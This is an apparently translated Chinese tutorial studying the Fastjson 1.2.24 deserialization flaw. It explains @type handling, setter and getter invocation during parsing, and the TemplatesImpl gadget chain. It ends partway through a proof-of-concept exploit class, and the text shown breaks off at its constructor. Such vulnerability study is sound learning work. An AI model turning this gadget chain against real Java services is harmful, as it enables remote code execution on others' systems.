# Fastjson1.2.24反序列化学习
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
作者：江鸟@星盟
Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。
## 简单应用
###  环境
我是用idea+maven构造的，分为以下几步
    1. idea新建一个maven项目
    2. 修改pom.xml 引入fastjson
                com.alibaba
                fastjson
                1.2.24
###  序列化
Ser
    public class Ser {
        public static void main(String[] args) {
            User user = new User();
            user.setName("lisi");
            String jsonstring = JSON.toJSONString(user, SerializerFeature.WriteClassName);
            System.out.println(jsonstring);
        }
    }
结果
    setName is running ...
    getName is running ...
    {"@type":"User","name":"lisi"}
`SerializerFeature.WriteClassName`是`toJSONString`设置的一个属性值，设置之后在序列化的时候会多写入一个`[@type](https://github.com/type
"@type")`，即写上被序列化的类名，`type`可以指定反序列化的类，并且调用其`getter/setter/is`方法。
不加的时候结果中就没有[@type](https://github.com/type "@type")
    setName is running ...
    getName is running ...
    {"name":"lisi"}
上面说了有parseObject和parse两种方法进行反序列化，现在来看看他们之间的区别
    public static JSONObject parseObject(String text) {
            Object obj = parse(text);
            return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);
        }
parseObject其实也是使用的parse方法，只是多了一步toJSON方法处理对象。
###  反序列化
User
    /**
     * @program: fastjsontest
     * @description:
     * @author: 江鸟
     * @create: 2021-03-15 18:28
     **/
    public class User {
        private String name;
        public String getName() {
            System.out.println("getName is running ...");
            return name;
        }
        public void setName(String name) {
            System.out.println("setName is running ...");
            this.name = name;
        }
        @Override
        public String toString() {
            return "User{" +
                    "name='" + name + '\'' +
                    '}';
        }
    }
Test
    import com.alibaba.fastjson.JSON;
    /**
     * @program: fastjsontest
     * @description:
     * @author: 江鸟
     * @create: 2021-03-15 18:29
     **/
    public class Test {
        public static void main(String[] args) {
            String json = "{\"@type\":\"User\", \"name\":\"zhangsan\"}";
            Object obj = JSON.parse(json);
            System.out.println(obj); //输出User{name='zhangsan'}
        }
    }
结果为
    setName is running ...
    User{name='zhangsan'}
当输出一个object类型的对象时，会通过[@type](https://github.com/type
"@type")指定的进行解析，被解析成了User类型的对象
[@type](https://github.com/type "@type")属性起的作用，
**Fastjson支持在json数据中使用[@type](https://github.com/type
"@type")属性指定该json数据被反序列为什么类型的对象**
同时控制台也输出了 setName is running … ，
**说明在反序列化对象时，会执行javabean的setter方法为其属性赋值** 。
**parse成功触发了set方法，parseObject同时触发了set和get方法**
    //        Object obj = JSON.parse(json); // 不调用getter方法
            Object obj = JSON.parseObject(json);//都弹出计算机
## 1.2.24 反序列化
###  代码分析
通过设置断点，我们来找存在问题的漏洞代码，在测试代码Test中设置最开始的断点
`Object obj = JSON.parse(json);`
因为我们知道然后再进User中给调用的`setName`方法设置断点开始debug的时候跳转到第二个断点
往回找 找到了一个setValue方法
首先传入的是User类型，值为zhangsan，通过反射获取到类的方法名，然后调用方法进行赋值
在该方法中可以得出如下结论：
  1. fileldinfo类中包含javabean的属性名称及其setter、getter等Method对象，然后通过反射的方式调用setter方法为属性赋值。
  2. 当javabean中存在属性为AtomicInteger、AtomicLong、AtomicBoolean、Map或Collection类型，且fieldinfo.getOnly值为true时（当javabean的属性没有setter方法，只有getter方法时，该值为true），在反序列化时会调用该属性的getter方法。
## 漏洞利用
###  TemplatesImpl攻击调用链路
如果一个类中的Getter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。
TemplatesImpl类恰好满足这个要求：
`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`中存在一个名为`_outputPropertiesget`的私有变量，其getter方法中存在利用点，这个getter方法恰好满足了调用条件，在JSON字符串被解析时可以调用其在调用FastJson.parseObject()序列化为Java对象时会被调用
poc：
    /**
     * @program: fastjsontest
     * @description:fastjson1.2.24版本TemplatesImpl攻击调用链路
     * @author: 江鸟
     * @create: 2021-03-17 10:21
     **/
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import java.io.IOException;
    public class TEMPOC extends AbstractTranslet {
        public TEMPOC() throws IOException {